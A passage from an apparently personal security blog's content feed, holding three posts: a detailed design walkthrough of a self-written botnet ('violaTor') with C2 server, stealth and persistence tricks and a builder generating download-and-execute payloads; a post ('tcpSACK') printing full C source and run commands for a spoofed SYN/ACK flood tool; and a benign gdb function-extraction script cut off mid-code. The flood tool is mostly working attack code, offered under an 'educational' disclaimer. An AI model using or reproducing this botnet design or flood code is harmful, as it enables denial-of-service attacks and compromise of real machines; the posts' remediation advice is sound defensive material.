help of my 3 LLMs (all models found on huggingface).\nyou can view the code on my github . have a look and read alongside the blog to get a better understanding!\nthe violaTor network i wrote this botnet program in 3 parts:\nviolaBot.c: the main bot client script responsible for controlling the compromised systems (zombies).\nTor.c: the zombie master, aka the command-and-control (C2) server.\nbuilder.py: a python script that compiles the botnet code for various architectures and sets up the necessary environment for the botnet to operate.\ni wanted to create a program that built on and expanded my understanding of network programming and system-level operations, so there are a few characteristics that make this program particularly nasty.\ndistributed architecture: most botnets utilize a distributed architecture. this allows them to control a large number of infected machines without overloading the central server (Tor.c) while the clients (violaBot.c) execute the commands and report back to the server. this architecture also provides resilience against takedowns, as removing one zombie doesn\u0026rsquo;t affect the rest of the botnet.\ncustomizable + dynamic payloads: the builder.py generates payloads dynamically, allowing the attacker to customize the payloads with different IP addresses and bot filenames. this makes it difficult for security systems to detect and block the payloads, as they can change with each generation. the generated payloads include shell scripts that download and execute the zombie on the target, connecting it to the C2 server.\nmulti-layered attack capabilities: the botnet is equipped with multiple types of attack functions, which can launch a variety of attacks. for example, attacks like ZDP can be used to flood targets with traffic, potentially causing a denial-of-service. this versatility allows the botnet to adapt to different targets and situations, making it more potent than botnets with a single type of attack.\nrobust connection management: the C2 server (Tor.c) handles user authentication, command processing, and connection loss effectively. if the connection is lost, the server handles the disconnection and continues operating.\nstealth + persistence: the client violaBot.c employs several techniques to maintain stealth and persistence on the infected machine (zombie). it changes the working directory to /, ignoring the SIGPIPE signal, and sets up a new session, all of which help the zombie evade detection and removal.\nreal-time monitoring: the continuous update of the title in the terminal with the number of zombies and online users provides a real-time snapshot of the botnet\u0026rsquo;s size and activity.\nmulti-threaded design: the Tor.c script uses multi-threading to handle multiple zombies simultaneously. this design allows the C2 server to scale and manage a large number of bots without blocking or slowing down.\ncommand encoding: the violaBot.c script uses command encoding (decode) to interpret commands from the C2 server. this adds an extra layer of obfuscation, making it harder for security analysts to understand the botnet\u0026rsquo;s behaviour.\nresource management: example: the violaBot.c script frees up memory allocated for command parameters after processing the command. this helps to prevent memory leaks, which can otherwise slow down the zombie and potentially reveal the bot\u0026rsquo;s presence.\nerror handling: the program includes error handling mechanisms, such as checking the return values of functions and handling failed operations appropriately. this helps make the botnet more robust and less likely to crash due to errors.\nlow-level network programming: the program uses low-level network programming libraries (sys/socket.h, netinet/in.h, arpa/inet.h) to establish network connections and send/receive data. this gives the botnet fine-grained control over network operations and makes it more efficient.\nviolaBot.c this script is designed to connect to the C2 server, receive commands, and execute them.\nit includes a variety of libraries necessary for its operation:\nnetwork communication: \u0026lt;sys/socket.h\u0026gt;, \u0026lt;netinet/in.h\u0026gt;, \u0026lt;arpa/inet.h\u0026gt;\nsystem calls: \u0026lt;unistd.h\u0026gt;, \u0026lt;fcntl.h\u0026gt;, \u0026lt;sys/wait.h\u0026gt;\nstring manipulation: \u0026lt;string.h\u0026gt;, \u0026lt;strings.h\u0026gt;\nit also sets the sizes for the various buffers used in network communication and command processing (BUFFER_SIZE, SOCKBUF_SIZE, PRINT_BUF_LEN).\nthe script defines several global variables that store the state of the bot client.\nthe mainCommSock variable stores the main communication socket descriptor, which is used for communicating with the C2 server.\nthe currentServer variable stores the index of the current server in the server list.\nthe gotIP flag indicates whether the bot has obtained its IP address.\nthe pids pointer and numpids counter are used to store and track the PIDs of child processes created by the bot.\nthe MyIP struct stores the bot\u0026rsquo;s IP address.\nthe client needs to interpret and execute commands received from the C2 server, so i created a function processCmd, which takes a command string, tokenizes it into parameters using the strtok function, and checks the command name against a list of known commands. if a match is found, it calls the corresponding function to execute the command.\nlaunching multiple attacks simultaneously is integral to a botnet\u0026rsquo;s effectiveness. for this purpose, there are several functions (sendZgo, send0vhBypass__, sendZDP) that launch different types of attacks. they take parameters like the target\u0026rsquo;s IP, port, and duration of the attack, then use the listFork() to create a new process for each attack.\nthe main loop of the script is responsible for maintaining the connection to the C2 server and processing commands. it uses initConnection to establish a connection to the server, and waits 5 seconds before trying again if the connection fails. once the connection is established, it continuously reads from the socket, trims the received command, and passes it to processCmd for execution.\nthe bot client uses several techniques to maintain stealth and persistence on the zombie. it changes its working directory to /, making it harder to find the bot client\u0026rsquo;s files. it ignores the SIGPIPE signal, preventing the bot client from terminating if it tries to write to a disconnected socket. it also sets up a new session using the setsid function, detaching the bot client from its parent process and making it harder to terminate.\nfinally, the script includes proper error handling and resource management. this just means it checks the return values of functions and handles failed operations so it doesn\u0026rsquo;t crash due to errors. it then frees up memory allocated for command parameters after processing the command, preventing memory leaks that can slow down the zombie and reveal the bot.\nTor.c the Tor.c script serves as the zombie master (C2) server in the botnet system. it manages connections from clients, processes commands from users, and sends commands to its zombies.\nuser authentication: the script uses a simple but effective authentication mechanism to ensure that only authorized users can interact with the botnet. the strcmp function is used to compare the entered password (buf) with the stored password (accounts[find_line].password). if the passwords don\u0026rsquo;t match, the goto statement jumps to the failed label, which then disconnects the client. this mechanism is implemented in the clientWorker function, which handles interactions with each connected client.\nTitleWriter: this function is a separate thread that runs in an infinite loop, updating the title in the terminal every second. it uses the sprintf function to format a string that includes the number of connected bots (clientCount) and the number of clients (managersCount). the write function is used to update the terminal title with this string, which provides a real-time update on the size of the botnet.\ncommand handling: implemented in the clientWorker function. it uses the FD_ISSET function to check if there\u0026rsquo;s data to read from the client\u0026rsquo;s socket. if there is, it reads the data into a buffer (buf) and then uses a series of if statements to check for specific command. for example, if the STATS command is detected, it uses the sprintf and send functions to send back a string that includes the number of connected bots and the number of clients.\nbanner display: self-explanatory. once authentication is successful, a banner is sent to the client. this is just to provide a user-friendly interface.\nconnection management: handled in the main function. it uses the socket, setsockopt, bind, and listen functions to set up a socket that listens for incoming connections. when a bot client connects (accept), the server adds the client\u0026rsquo;s IP address to its list of connected clients (clientList) and starts a new thread (pthread_create). [note: for concurrency control, a mutex (pthread_mutex_t) is used to control access to shared resources (like clientList) among multiple threads. this prevents race conditions and ensures that the server operates correctly when handling multiple clients simultaneously.]\nmulti-threading: the pthread library is used for this.\nsignal handling: a signal handler for the SIGPIPE signal is included. this signal is sent to a process when it tries to write to a socket that has been closed on the other end. by ignoring this signal (signal(SIGPIPE, SIG_IGN)), the script prevens the server from crashing when it tries to write to a disconnected client socket.\nerror handling: error handling mechanisms to make the botnet more robust. for example, socket, bind, listen, accept all return a value that is checked against -1 (error). if an error is detected, the perror function is used to print a descriptive error message and the exit function is used to terminate the program.\nbuilder.py this is a builder script for generating payloads. it\u0026rsquo;s designed to create customized payloads that, when executed on a target, install and run the bot client.\nimports + constants: the script imports necessary python libraries such as os for interacting with the operating system, sys for accessing system-specific parameters and functions, and random for generating random numbers. it also defines several constants used in the script. for instance, PAYLOAD_NAME specifies the name of the payload file, PAYLOAD_DIR specifies the directory where the payload files will be stored, SERVER_LIST is a list of server IP addresses and ports, and ARCHS is a list of architectures for which the payloads will be generated.\npayload generation: the generate_payload function generates a shell script that, when executed on a target machine, downloads and runs the bot client. it uses python\u0026rsquo;s string formatting to insert the server IP, port, and architecture into the shell script. the shell script uses wget and curl to download the bot client from the server, chmod to make the downloaded file executable, and ./ to run the executable file.\nmain function: the main function of the script loops over each server in the server list and each architecture in the architecture list, calling the generate_payload function with the server IP, port, and architecture as parameters. it then writes the generated payload to a file using python\u0026rsquo;s built-in open function with the \u0026lsquo;write\u0026rsquo; mode (w).\nfile operations: the script uses the os.path.exists function to check if the payload directory exists, and the os.makedirs function to create the directory if it doesn\u0026rsquo;t exist. it then uses the open function to create a file in the payload directory for each payload, and the write method to write the payload to the file.\nrandomization: the script uses the random.choice function to randomly select a server from the server list for each payload. this adds an element of unpredictability to the payloads, making it harder for security systems to predict and block them.\nremediation a botnet like this isn\u0026rsquo;t particularly unique. there are thousands, if not millions, just like it floating around on the internet, just looking for victims.\nnetwork monitoring and intrusion detection systems (IDS): network monitoring involves analyzing network traffic to identify anomalies or suspicious activities. an IDS can automatically detect potential threats based on predefined rules or unusual patterns. for instance, repeated attempts to connect to the same IP address or port, or a sudden spike in outbound traffic, could indicate botnet activity. IDS solutions can be signature-based (detecting known threats) or anomaly-based (detecting deviations from normal behavior).\nendpoint protection solutions: endpoint protection solutions provide a suite of security capabilities for individual devices (endpoints), such as antivirus, antispyware, firewall, and intrusion detection functionalities. they can detect and block malicious activities, including the installation and operation of bot clients. advanced solutions may also include behavioral analysis to detect unknown threats.\nfirewall configuration: firewalls can be configured to block outgoing connections to the IP addresses and ports used by the C2 servers. this can be done by setting up outbound rules in the firewall to deny traffic to these addresses and ports. by blocking these connections, the bot client is prevented from receiving commands, effectively neutralizing it.\nregular system scans: regular system scans can help detect the presence of the bot client on the system. antivirus software or other malware detection tools can be used for this purpose. these tools scan the system\u0026rsquo;s files and memory for known malicious signatures or suspicious behavior. if the bot client is detected, it should be removed immediately using the tool\u0026rsquo;s removal function.\nuser education: users should be educated about the dangers of downloading and running unknown files, as this is a common way for bot clients to be installed. they should be taught to only download files from trusted sources and to avoid clicking on suspicious links. phishing attempts, which can deliver the bot client via email attachments or malicious links, should also be covered in security awareness training.\nsoftware updates and patching: keeping all systems and software updated with the latest patches is crucial for preventing botnet infections. many bot clients exploit known vulnerabilities in software to gain unauthorized access or escalate privileges. regular updates and patches fix these vulnerabilities, making these exploits ineffective.\naccess controls: implementing strict access controls can limit the potential impact of a bot client. this includes using least privilege principles, where users are given the minimum levels of access necessary to perform their duties. this can prevent the bot client from gaining access to sensitive data or critical systems.\nincident response plan: an incident response plan provides a structured approach for dealing with botnet infections. it should include steps for detecting the infection, containing the damage, eradicating the bot client, and recovering from the attack. the plan should also include communication protocols for notifying affected parties and reporting the incident to relevant authorities.\n","date":"2023-12-21","permalink":"//localhost:1313/posts/violator/","section":"","summary":"","tags":[],"title":"violaTor"},{"categories":[],"contents":"i really love this film.\n","date":"2023-12-20","permalink":"//localhost:1313/photography/new_post9/","section":"","summary":"","tags":[],"title":"portra 800"},{"categories":[],"contents":"a number of years ago, i received advice that would deeply change my outlook on engineering and understanding of technology.\nif you want to understand how something works, build it.\nat the time, i was a little too impatient to actually grasp the nuances of such advice, because i had the immediate gratification of well-built programs and tools to carry out whatever tasks i needed to. but as i delved deeper into security and pentesting, i understood that not everything is as well understood by everyone as i had once thought. lately, i\u0026rsquo;ve been ruminating about fundamental misunderstandings of seemingly straightforward and basic networking concepts, and how that leads to slip-ups and oversights inside organizations. in this post, we\u0026rsquo;re going to look at a cornerstone of the networking world, the TCP Handshake, and then an attack i wrote that specifically targets it, known as a SYN-ACK spoofing attack.\nTCP handshake the TCP handshake is a 3-step process that occurs when devices (typically, a client and a server) attempt to establish a network connection. it\u0026rsquo;s used in many network protocols, like HTTP/HTTPS, SSH, and more.\nSYN (synchronize) the client sends a TCP packet with the SYN flag set to the server.\nthe packet indicates an initiation of a connection request and contains an ISN (initial sequence number) generated by the client.\nthe client asks the server to acknowledge (ACK) this sequence number.\nSYN-ACK (synchronize-acknowledge) the server then responds with a TCP packet that has both SYN and ACK flags set.\nthis acknowledges the client\u0026rsquo;s sequence number and also contains the server\u0026rsquo;s own ISN.\nACK (acknowledge) the client then sends a final ACK packet to acknowledge the client\u0026rsquo;s ISN.\nthis completes the handshake, and both parties now exchange data, in both directions.\nthe SYN-ACK spoofing attack in this attack, an attacker (me) manipulates the TCP handshake process to disrupt or compromise network communication.\nsteps a spoofed TCP packet is sent to a target server.\nthe packet contains a spoofed source IP address, making it appear as if it\u0026rsquo;s coming from a legitimate client.\nthe attacker\u0026rsquo;s packet has the SYN flag set, which simulates the start of a legitimate TCP connection.\nthe target server, believing it\u0026rsquo;s responding to a legitimate client, sends back a SYN-ACK packet to the spoofed source IP address.\nsince the source IP address is spoofed, the SYN-ACK response doesn\u0026rsquo;t reach a legitimate client.\nit\u0026rsquo;s now lost in the network, maybe reaching a non-existent or unreachable IP address.\nthe target server allocates resources for this connection, waiting for the \u0026ldquo;legitimate\u0026rdquo; client\u0026rsquo;s ACK response to complete the handshake.\nthis wait ties up the server\u0026rsquo;s resources and creates a potential DoS (denial of service) condition.\nthe attacker can continue sending such spoofed SYN packets, which causes the server to allocate more and more resources for non-existent connections, which then leads to resource exhaustion and service disruption.\nimpacts service disruption: the attack leads to service disruption, as the server\u0026rsquo;s resources are eventually exhausted and legitimate clients are unable to establish connections.\ncongestion: the attack\u0026rsquo;s traffic can cause network congestion, which affects the overall network\u0026rsquo;s performance.\nin the image below, taken from wireshark, we can see the massive spike in overall packets.\nattackers tend to use this attack because it evades detection mechanisms and bypasses security solutions that rely on analyzing network traffic patterns. it\u0026rsquo;s hard to trace, and it can also lead to more serious security breaches based on the target\u0026rsquo;s TCP/IP stack.\ntcpSACK i wrote tcpSACK to carry out a SYN-ACK spoofing attack by generating and sending TCP packets with spoofed IPv4 addresses to a target server. the aim is to disrupt the target\u0026rsquo;s network communication by making the server allocate increasing resources for non-existent connections, eventually causing service disruption and resource exhaustion.\nDISCLAIMER: this is for purely educational purposes. hacking is WRONG and BAD.\nthe script can be fired up in a terminal, and run.\n./tcpSACK \u0026lt;target_ip\u0026gt; \u0026lt;target_port\u0026gt; \u0026lt;num_threads\u0026gt; \u0026lt;attack_duration_seconds\u0026gt; \u0026lt;max_pps\u0026gt; the arguments are self-explanatory. if the attack is to be carried out against 192.168.1.100 on port 80 using 4 threads, running for 60 seconds, and limited to a maximum 1000 pps, the command is as follows.\n./tcpSACK 192.168.1.100 80 4 60 1000 the entire code follows\u0026hellip;\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;sys/socket.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;netinet/tcp.h\u0026gt; #include\u0026lt;arpa/inet.h\u0026gt; #include\u0026lt;netinet/ip.h\u0026gt; #include\u0026lt;pthread.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; #include\u0026lt;sys/types.h\u0026gt; #include\u0026lt;stdbool.h\u0026gt; #include\u0026lt;time.h\u0026gt; // declare global variables static unsigned int floodport; // port to send packets to #define BUFFER_SIZE 100 // buffer size constant char sourceip[17]; // source IP address buffer volatile int limiter; // pps (packets per second) limiter volatile unsigned int pps; // pps count volatile unsigned sleeptime = 100; // sleep (ms) for each packet if pps limit is exceeded volatile unsigned int length_packet = 0; // length of packet (can be set for bypassing) // mutex for thread safety when modifying global variable \u0026#34;pps\u0026#34; pthread_mutex_t pps_mutex = PTHREAD_MUTEX_INITIALIZER; // structure for pseudo tcp header used in checksum calculation struct pseudo_header { u_int32_t source_address; u_int32_t dest_address; u_int8_t placeholder; u_int8_t protocol; u_int16_t tcp_length; struct tcphdr tcp; }; // calculate checksum for packet unsigned short checksum_tcp_packet(unsigned short *ptr,int nbytes) { register long sum; unsigned short oddbyte; register short answer; // checksum calculation sum=0; while(nbytes \u0026gt; 1) { sum += *ptr++; nbytes -= 2; } // handle odd byte if(nbytes == 1) { oddbyte = 0; *((u_char*)\u0026amp;oddbyte) = *(u_char*)ptr; sum += oddbyte; } // fold sum to 16 bits and take complement sum = (sum \u0026gt;\u0026gt; 16) + (sum \u0026amp; 0xffff); sum += (sum \u0026gt;\u0026gt; 16); answer = (short)~sum; return(answer); } // thread function that performs flooding void *flooding_thread(void *par1) { // create raw socket int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP); if(s == -1) { perror(\u0026#34;[!] you need to run the script as root [!]\u0026#34;); exit(1); } // declare variables char *targettr = (char *)par1; char datagram[4096], source_ip[32], *data, *pseudogram; memset(datagram, 0, 4096); // clear the buffer // ipv4 header struct iphdr *iph = (struct iphdr *) datagram; // tcp header struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip)); struct sockaddr_in sin; struct pseudo_header psh; // data part of packet data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr); if(length_packet == 0) { strcpy(data, \u0026#34;\u0026#34;); // bypasses pps limit if set to 0 } // randomize source address (ipv4) snprintf(source_ip, 32, \u0026#34;%d.%d.%d.%d\u0026#34;, rand() % 256, rand() % 256, rand() % 256, rand() % 256); sin.sin_family = AF_INET; int rdzeroport; // pick a random destination port if (floodport == 1) { rdzeroport = rand() % 65535 + 1; sin.sin_port = htons(rdzeroport); tcph-\u0026gt;dest = htons(rdzeroport); } else { sin.sin_port = htons(floodport); tcph-\u0026gt;dest = htons(floodport); } // other ip packet handlers sin.sin_addr.s_addr = inet_addr(targettr); iph-\u0026gt;ihl = 5; iph-\u0026gt;version = 4; iph-\u0026gt;tos = 0; iph-\u0026gt;tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data); iph-\u0026gt;id = htons(1); iph-\u0026gt;frag_off = 0; iph-\u0026gt;ttl = 64; iph-\u0026gt;protocol = IPPROTO_TCP; iph-\u0026gt;check = 0; // set to 0 before calculating the checksum iph-\u0026gt;saddr = inet_addr(source_ip); iph-\u0026gt;daddr = sin.sin_addr.s_addr; iph-\u0026gt;check = checksum_tcp_packet((unsigned short *) datagram, iph-\u0026gt;tot_len); // randomizing tcp header fields int randSeq = rand()% 10000 + 99999; int randAckSeq = rand() % 10000 + 99999; int randSP = rand() % 2 + 65535; // int randWin = rand()%1000 + 9999; tcph-\u0026gt;source = randSP; // random source port tcph-\u0026gt;seq = randSeq; tcph-\u0026gt;ack_seq = 0; // initially 0 but will be set for ACK packets tcph-\u0026gt;doff = 5; tcph-\u0026gt;fin = 0; tcph-\u0026gt;syn = 1; tcph-\u0026gt;rst = 0; tcph-\u0026gt;psh = 0; tcph-\u0026gt;ack = 0; tcph-\u0026gt;urg = 0; tcph-\u0026gt;window = htons(5840); // max window size tcph-\u0026gt;check = 0; // checksum tcph-\u0026gt;urg_ptr = 0; // alternate between SYN/ACK flags if (rand() % 2) { tcph-\u0026gt;syn = 1; // SYN packet tcph-\u0026gt;ack = 0; } else { tcph-\u0026gt;syn = 0; tcph-\u0026gt;ack = 1; // ACK packet tcph-\u0026gt;ack_seq = htonl(randAckSeq); } // set up pseudo-header for checksum psh.source_address = inet_addr(source_ip); psh.dest_address = sin.sin_addr.s_addr; psh.placeholder = 0; psh.protocol = IPPROTO_TCP; psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data)); int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data); pseudogram = malloc(psize); // copy headers to pseudogram for checksum calculation memcpy(pseudogram, (char*)\u0026amp;psh, sizeof(struct pseudo_header)); memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data)); tcph-\u0026gt;check = checksum_tcp_packet((unsigned short*) pseudogram, psize); free(pseudogram); // free memory to prevent leaks // set up socket options int one = 1; const int *val = \u0026amp;one; if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) \u0026lt; 0) { perror(\u0026#34;error setting up IP_HDRINCL\u0026#34;); exit(1); } // flood loop while (1) { pthread_mutex_lock(\u0026amp;pps_mutex); pps++; if(pps \u0026gt;= limiter) { usleep(sleeptime); } pthread_mutex_unlock(\u0026amp;pps_mutex); // send loop if (sendto(s, datagram, iph-\u0026gt;tot_len, 0, (struct sockaddr *)\u0026amp;sin, sizeof(sin)) \u0026lt; 0) { break; // exit loop if send fails } close(s); // close the socket return NULL; } // main function int main(int argc, char *argv[]) { if(argc \u0026lt; 6){ fprintf(stderr, \u0026#34;[+] tcpSACK [+]\\n\u0026#34;); fprintf(stderr, \u0026#34;[+] usage: %s \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; \u0026lt;number of threads\u0026gt; \u0026lt;time\u0026gt; \u0026lt;pps\u0026gt;\\n\u0026#34;, argv[0]); exit(-1); } //int multiplier = 20; //pps = 0; //limiter = 0; // arguments floodport = atoi(argv[2]); void *target = argv[1]; int max_pps = atoi(argv[5]); int num_threads = atoi(argv[3]); length_packet = 0; pthread_t thread[num_threads]; // thread creation //int alem = 0; fprintf(stdout, \u0026#34;[+] starting threads...\\n\u0026#34;); for(int i = 0; i \u0026lt; num_threads; i++){ if(pthread_create(\u0026amp;thread[i], NULL, \u0026amp;flooding_thread, target) != 0){ perror(\u0026#34;thread creation failed!\u0026#34;); exit(1); } } //for(alem = 0;alem \u0026lt; num_threads;alem++){ // if(pthread_create(\u0026amp;thread[alem], NULL, \u0026amp;flooding_thread, (void *)argv[1]) != 0) { // perror(\u0026#34;thread creation failed!\u0026#34;); // exit(1); //} //} fprintf(stdout, \u0026#34;[-] attack started!\\n\u0026#34;); // control loop for packet send rate for(int i = 0;i \u0026lt; (atoi(argv[4]) * 1000);i++) { usleep(1000); pthread_mutex_lock(\u0026amp;pps_mutex); if(pps \u0026gt; max_pps) { limiter++; sleeptime += 100; } else { if(limiter \u0026gt; 0) { limiter--; } } if(sleeptime \u0026gt; 25) { sleeptime -= 25; } else { sleeptime = 0; } } pps = 0; pthread_mutex_unlock(\u0026amp;pps_mutex); } // cleanup + exit for(int i = 0; i \u0026lt; num_threads; i++) { pthread_cancel(thread[i]); } return 0; } the script needs the standard C libraries and headers to work. the libraries include functions and data types that are typically needed for network programming, threading, and more.\nflow declaring global variables static unsigned int floodport; #define BUFFER_SIZE 100 char sourceip[17]; volatile int limiter; volatile unsigned int pps; volatile unsigned sleeptime = 100; volatile unsigned int length_packet = 0; floodport: the port to send packets to (target).\nsourceip: the buffer to store the source IP address in.\nlimiter: controls the packets per second (pps).\npps: counts the packets per second.\nsleeptime: the sleep time (in ms) for each packet if the pps limit is exceeded.\nlength_packet: the length of the packet, which is set to bypass the rate limiting. set to 0 in the script.\nthread safety pthread_mutex_t pps_mutex = PTHREAD_MUTEX_INITIALIZER; pps_mutex: this mutex is for thread safety when modifying the global variable pps. i wrote it in when i realized people might be trying to run the script without understanding what it does, and it\u0026rsquo;s a protection measure that prevents data corruption by ensuring only one thread can access a shared resource at a time.\npseudo-header object struct pseudo_header { u_int32_t source_address; u_int32_t dest_address; u_int8_t placeholder; u_int8_t protocol; u_int16_t tcp_length; struct tcphdr tcp; }; pseudo_header: structure that represents a pseudo TCP header.\nthis is going to be used in checksum calculations.\nchecksum calculation unsigned short checksum_tcp_packet(unsigned short *ptr,int nbytes) { // ... // // ... } checksum_tcp_packet: this calculates the checksum for a TCP packet.\nchecksums are used to ensure the integrity of data in the packet during transmission.\nmain thread function void *flooding_thread(void *par1) { // ... // // ... } flooding_thread: this function performs the flooding attack.\nit creates raw sockets, prepares packets, and sends them to the target.\nthis is also where the alternation between SYN/ACK flags is set\nthe main function // main function int main(int argc, char *argv[]) { if(argc \u0026lt; 6){ fprintf(stderr, \u0026#34;[+] tcpSACK [+]\\n\u0026#34;); fprintf(stderr, \u0026#34;[+] usage: %s \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; \u0026lt;number of threads\u0026gt; \u0026lt;time\u0026gt; \u0026lt;pps\u0026gt;\\n\u0026#34;, argv[0]); exit(-1); } // ... floodport = atoi(argv[2]); void *target = argv[1]; int max_pps = atoi(argv[5]); int num_threads = atoi(argv[3]); length_packet = 0; pthread_t thread[num_threads]; // ... fprintf(stdout, \u0026#34;[+] starting threads...\\n\u0026#34;); for(int i = 0; i \u0026lt; num_threads; i++){ if(pthread_create(\u0026amp;thread[i], NULL, \u0026amp;flooding_thread, target) != 0){ perror(\u0026#34;thread creation failed!\u0026#34;); exit(1); } } fprintf(stdout, \u0026#34;[-] attack started!\\n\u0026#34;); for(int i = 0; i \u0026lt; (atoi(argv[4]) * 1000); i++) { usleep(1000); pthread_mutex_lock(\u0026amp;pps_mutex); if(pps \u0026gt; max_pps) { limiter++; sleeptime += 100; } else { if(limiter \u0026gt; 0) { limiter--; } } if(sleeptime \u0026gt; 25) { sleeptime -= 25; } else { sleeptime = 0; } pthread_mutex_unlock(\u0026amp;pps_mutex); } pps = 0; pthread_mutex_unlock(\u0026amp;pps_mutex); for(int i = 0; i \u0026lt; num_threads; i++) { pthread_cancel(thread[i]); } return 0; } the main function is the entry point of the script.\nit checks if the script is provided with the required command-line arguments (target IP, target port, number of threads, attack duration, maximum pps).\nthe global variables from earlier are set based on the command-line arguments.\nan array of threads (threads[num_threads]) is created to perform the attack, with each thread executing the flooding_thread function.\nthe script then enters a control loop that manages the packet send rate based on the max_pps limit.\nonce the attack duration is reached, the script cancels all threads, performs a cleanup, and exits!\nprotection given how easy it is to write and carry out this attack, and how impactful it is, it follows that protection against it is of paramount importance.\nrate limiting: implement a rate-limiting procedure to control the number of connection attempts from a single source IP address within a specified time frame.\nfirewalls: configure firewalls to filter and drop incoming packets with spoofed source IP addresses.\nIDS (intrusion detection systems): use IDS solutions to detect unusual traffic patterns, including a high rate of SYN-ACK packets.\nSYN cookies: enable SYN cookies on servers to mitigate resource exhaustion + SYN cookies allow the server to track connection requests without allocating resources until the handshake is completed.\nnetwork monitoring: continuously monitor network traffic for anomalies and take action when unusual patterns are detected.\nbehavioral analysis: building off of network monitoring, implement BA techniques to detect and respond to abnormal traffic behaviour.\nRBAC (rate-based access control): apply rate-based access control lists to limit the rate at which connections are accepted.\nTCP stack hardening: keep the OS and TCP/IP stack up to date, to address known vulnerabilities.\nincident response: develop an IR plan to respond to and mitigate the effects of SYN-ACK spoofing attacks.\nif you stick to the above, and keep an eye out for attacks in the wild, you\u0026rsquo;ll eventually learn the TTPs used by attackers and how to delineate and protect against them.\n","date":"2023-12-07","permalink":"//localhost:1313/posts/tcpsack/","section":"","summary":"","tags":[],"title":"tcpSACK"},{"categories":[],"contents":"over the past few days, i\u0026rsquo;ve been writing tools that automate cumbersome manual tasks and make my workflow/toolchain cleaner and pushing them to my personal github. the latest one in this series is a tool i call gdbExtract .\nas a security researcher, i spend a lot of time diving deep into the worlds of software security and system analysis. in these domains, binary analysis and reverse engineering are critical tasks, but their challenging and complex nature can come across as intimidating. hackers rely on this fact to conceal a myriad of functions inside binaries that perform unwanted actions, but this tool can help shed some light on them. it\u0026rsquo;s not exactly a replacement for popular and powerful applications like IDA Pro, but it\u0026rsquo;s a quick way to reveal hidden and integral information about binaries.\ngdbExtract is, first and foremost, an automation tool. it was created to streamline the tedious process of binary analysis. manually examining binaries using tools like GDB requires significant effort and expertise. gdbExtract automates the extraction of crucial function information, transforming a potentially labour-intensive task into a quicker and more reliable process.\nefficiency: automating the extraction process saves time but also ensures consistent results (crucial when dealing with multiple or large binaries). structured output: by outputting data in a JSON format, the script turns raw, hard-to-parse information into a structured form, paving the way for more advanced analysis techniques. versatility and accessibility: the script is designed to be noob-friendly but can also help seasoned professionals. core functionalities note: before running, edit the script to point to your specific binary file and output file. there\u0026rsquo;s also a list of \u0026ldquo;unsafe\u0026rdquo; function strings, that you can edit to fit your criteria.\nhere\u0026rsquo;s the script in its entirety.\nimport os import sys import json import subprocess import logging from typing import List, Dict # configure basic logging to display errors and info logging.basicConfig(level=logging.INFO) # constants for file paths and binary to be analyzed BINARY_PATH = \u0026#34;/path/to/binary\u0026#34; DATA_FILE = \u0026#34;path/to/file.json\u0026#34; riskyFunctions = [\u0026#39;strcpy\u0026#39;, \u0026#39;strncpy\u0026#39;, \u0026#39;memcpy\u0026#39;, \u0026#39;memset\u0026#39;, \u0026#39;send\u0026#39;, \u0026#39;recv\u0026#39;] # GDB command to list all functions in binary # returns output from GDB as string def run_gdb_command(binary_path: str) -\u0026gt; str: try: return subprocess.check_output([\u0026#34;gdb\u0026#34;, \u0026#34;-batch\u0026#34;, \u0026#34;-ex\u0026#34;, \u0026#34;info functions\u0026#34;, binary_path]) except subprocess.CalledProcessError as e: logging.error(f\u0026#34;GDB command failed: {e}\u0026#34;) sys.exit(1) # parse output from GDB to extract function info # returns list of dicts, each containing details of single function def parse_gdb_output(gdb_output: str) -\u0026gt; List[Dict]: json_data = [] for line in gdb_output.splitlines(): if not line.startswith(\u0026#34;0x\u0026#34;): continue address, name, signature = line.strip().split() json_data.append({\u0026#34;address\u0026#34;: address, \u0026#34;name\u0026#34;: name, \u0026#34;signature\u0026#34;: signature}) return json_data # reads json file and returns content def read_json_file(file_path: str) -\u0026gt; List[Dict]: try: with open(file_path, \u0026#34;r\u0026#34;) as file: return json.load(file) except IOError as e: logging.error(f\u0026#34;error reading file {file_path}: {e}\u0026#34;) return [] except json.JSONDecodeError as e: logging.error(f\u0026#34;error decoding JSON from file {file_path}: {e}\u0026#34;) # writes list of dicts to json file def write_json_file(file_path: str, data: List[Dict]): try: with open(file_path, \u0026#34;w\u0026#34;) as file: json.dump(data, file, indent=4) # indentation for readability except IOError as e: logging.error(f\u0026#34;error writing to file {file_path}: {e}\u0026#34;) # main function that extracts function info from binary via GDB def main_search_code(): gdb_output = run_gdb_command(BINARY_PATH) json_data = parse_gdb_output(gdb_output) write_json_file(DATA_FILE, json_data) # filters out functions deemed \u0026#34;safe\u0026#34; and writes the rest to new json file def remove_safe_functions(): json_data = read_json_file(DATA_FILE) filtered_json_data = [func for func in json_data if func[\u0026#39;name\u0026#39;] not in riskyFunctions] write_json_file(\u0026#34;filtered_file.json\u0026#34;, filtered_json_data) # combines multiple entries of the same function into a single record # tracks number of occurrences of each function def combine_data_for_same_function(): json_data = read_json_file(\u0026#34;filtered_file.json\u0026#34;) combined_json_data = {} for func in json_data: if func[\u0026#34;name\u0026#34;] not in combined_json_data: combined_json_data[func[\u0026#34;name\u0026#34;]] = { \u0026#34;addresses\u0026#34;: [func[\u0026#34;address\u0026#34;]], \u0026#34;signature\u0026#34;: func[\u0026#34;signature\u0026#34;], \u0026#34;count\u0026#34;: 1, } else: combined_json_data[func[\u0026#34;name\u0026#34;]][\u0026#34;addresses\u0026#34;].append(func[\u0026#34;address\u0026#34;]) combined_json_data[func[\u0026#34;name\u0026#34;]][\u0026#34;count\u0026#34;] += 1 write_json_file(\u0026#34;combined_file.json\u0026#34;, combined_json_data) # lists all functions in json data file def list_functions(): json_data = read_json_file(DATA_FILE) for func in json_data: 